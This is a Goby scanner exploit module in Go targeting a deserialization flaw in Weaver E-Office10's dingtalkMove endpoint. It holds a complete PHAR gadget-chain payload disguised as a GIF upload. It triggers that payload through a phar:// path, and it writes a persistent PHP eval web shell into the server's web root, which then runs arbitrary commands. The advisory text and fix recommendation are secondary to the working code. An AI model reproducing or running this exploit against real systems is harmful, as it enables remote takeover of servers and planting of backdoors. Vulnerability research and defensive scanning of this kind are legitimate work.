package exploits

import (
	"crypto/md5"
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Fanwei E-Office10  dingtalkMove Method Deserialization Lead to Code Execution Vulnerability",
    "Description": "<p>Fanwei E-Office10 is an online office system of Shanghai Fanwei Network Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the imgs parameter of dingtalkMove in the version of Fanwei E-Office10 before v20220523. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-07-18",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" || body=\"/eoffice10/client\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" || body=\"/eoffice10/client\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization vulnerability in the imgs parameter of dingtalkMove in the version of Fanwei E-Office10 before v20220523. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version</p><p><a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p><p>2. Deploy a web application firewall to monitor deserialization operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "system(\"whoami\");",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "泛微E-Office10 dingtalkMove方法反序列化导致代码执行漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微E-Office10是上海泛微网络科技股份有限公司的一套在线办公系统。</p><p>泛微E-Office10的在v20220523之前的版本的dingtalkMove的imgs参数存在反序列化漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、厂商已修复此漏洞， 请升级至最新版 <a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p><p>2、部署web应用防火墙，对反序列化操作进行监控</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p>泛微E-Office10的在v20220523之前的版本的dingtalkMove的imgs参数存在反序列化漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "信创",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Fanwei E-Office10  dingtalkMove Method Deserialization Lead to Code Execution Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Fanwei E-Office10 is an online office system of Shanghai Fanwei Network Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the imgs parameter of dingtalkMove in the version of Fanwei E-Office10 before v20220523. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version</p><p><a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p><p>2. Deploy a web application firewall to monitor deserialization operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>There is a deserialization vulnerability in the imgs parameter of dingtalkMove in the version of Fanwei E-Office10 before v20220523. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	upload_file123dsausj := func(u *httpclient.FixUrl) string {
		cfg := httpclient.NewPostRequestConfig("/eoffice10/server/public/api/attachment/atuh-file")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		pre, _ := url.QueryUnescape("GIF89a%3C%3Fphp__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0A%1D%02%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%E7%01%00%00O%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A2%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A2%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00method%22%3Ba%3A1%3A%7Bs%3A10%3A%22__toString%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A159%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A36%3A%22function%28%29%7B%40eval%28%24_REQUEST%5B%27img%27%5D%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000005a75928d000000004dba0bee%22%3B%7D%7D%7Ds%3A14%3A%22_fn___toString%22%3Br%3A4%3B%7Ds%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bi%3A1%3B%7D%08%00%00%00test.txt%04%00%00%00%DCF%EBb%04%00%00%00%0C%7E%7F%D8%B6%01%00%00%00%00%00%00test%06%DEfNdL%BD%21%CE%0A%9A%E2%EC%8C%DD%F9jc%DB%9C%02%00%00%00GBMB")
		cfg.Header.Store("Referer", u.FixedHostInfo)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ")
		cfg.Data = "------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\n"
		cfg.Data += "Content-Disposition: form-data; name=\"Filedata\"; filename=\"a.license\"\r\n"
		cfg.Data += "Content-Type: image/gif\r\n\r\n"
		cfg.Data += pre + "\r\n"
		cfg.Data += "------WebKitFormBoundaryLx7ATxHThfk91oxQ--"
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "attachment_id") {
			var d map[string]interface{}
			err := json.Unmarshal([]byte(resp.RawBody), &d)
			if err != nil {
				return "error"
			}
			url := d["data"].(map[string]interface{})["attachment_id"].(string)
			return url
		} else {
			return "error"
		}
	}

	MD5vsiodanq := func(str string) string {
		data := []byte(str) //切片
		has := md5.Sum(data)
		md5str := fmt.Sprintf("%x", has) //将[]byte转成16进制
		return md5str
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/eoffice10/server/public/eoffice10_test.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "202cb962ac59075b964b07152d234b70") {
				return true
			} else {
				now := time.Now().Unix()
				day := time.Now().Format("2006/01/02 03:04:05 PM")
				after_day := day[0:10]
				phar_url := upload_file123dsausj(u)
				if phar_url != "error" {
					for i := 0; i < 10; i++ {
						now_str := now + int64(i)
						jiami_str := fmt.Sprintf("%da.license", now_str)
						filename := fmt.Sprintf("%s.license", MD5vsiodanq(jiami_str))
						cfg1 := httpclient.NewPostRequestConfig("/eoffice10/server/public/api/dingtalk/dingtalk-move")
						cfg1.VerifyTls = false
						cfg1.FollowRedirect = false
						cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg1.Data = "imgs=phar://../../../../attachment/" + after_day + "/" + phar_url + "/" + filename + "/test.txt&img=file_put_contents($_SERVER['DOCUMENT_ROOT'].'/eoffice10/server/public/eoffice10_test.php',hex2bin('3c3f706870206563686f206d643528313233293b203f3e'));"
						if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
							if resp2, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp2.RawBody, "202cb962ac59075b964b07152d234b70") {
								return true
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			code := ss.Params["code"].(string)
			uri := "/eoffice10/server/public/eoffice10_test.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "img=" + code
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && !strings.Contains(resp.RawBody, "202cb962ac59075b964b07152d234b70") {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			} else {
				now := time.Now().Unix()
				day := time.Now().Format("2006/01/02 03:04:05 PM")
				after_day := day[0:10]
				phar_url := upload_file123dsausj(expResult.HostInfo)
				if phar_url != "error" {
					for i := 0; i < 10; i++ {
						now_str := now + int64(i)
						jiami_str := fmt.Sprintf("%da.license", now_str)
						filename := fmt.Sprintf("%s.license", MD5vsiodanq(jiami_str))
						cfg1 := httpclient.NewPostRequestConfig("/eoffice10/server/public/api/dingtalk/dingtalk-move")
						cfg1.VerifyTls = false
						cfg1.FollowRedirect = false
						cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg1.Data = "imgs=phar://../../../../attachment/" + after_day + "/" + phar_url + "/" + filename + "/test.txt&img=file_put_contents($_SERVER['DOCUMENT_ROOT'].'/eoffice10/server/public/eoffice10_test.php',hex2bin('3c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e'));"
						if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
							if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
								expResult.Success = true
								expResult.Output = resp.Utf8Html
							}
						}
					}
				}
			}
			return expResult //输出exp执行结果的格式
		},
	))
}
